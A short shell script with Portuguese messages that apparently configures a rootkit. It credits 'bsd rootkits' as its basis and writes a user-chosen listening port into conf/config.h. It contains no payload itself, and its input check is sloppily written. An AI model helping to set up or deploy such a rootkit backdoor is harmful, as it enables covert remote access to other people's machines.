clear
echo "
/*
 * by kosu @ greetz lowlife     $
 * based on design bsd rootkits $
 *                             */
"
echo

echo "/* --- CONFIG PORT --- */"
echo
read -p " [$] INSERT PORT: " port

if [ $port == `cat /dev/null` ]
then
	echo "[X] ERRO! Insira uma porta..."; echo
else
	continue
fi

echo "int lport = $port;" > conf/config.h
clear
echo "Ok! Porta configurada"; echo
